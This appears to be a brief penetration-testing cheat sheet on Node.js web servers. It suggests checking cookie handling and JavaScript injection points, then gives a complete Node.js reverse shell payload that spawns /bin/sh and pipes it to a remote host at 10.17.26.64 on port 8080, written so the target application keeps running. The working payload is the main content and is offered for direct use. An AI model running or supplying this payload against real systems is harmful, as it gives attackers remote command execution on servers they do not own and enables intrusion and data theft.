If we find a webserver with powered by Nodejs, we must have in mind:

- Check insecure management of cookies, specifically, cookies that aim to manage the security of the web when we steal credentials or create a new user.
- If we can introduce input in events, comments, or stuff like that, the server could be vulnerable to JavaScript injection.


```JavaScript ReverseShell
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
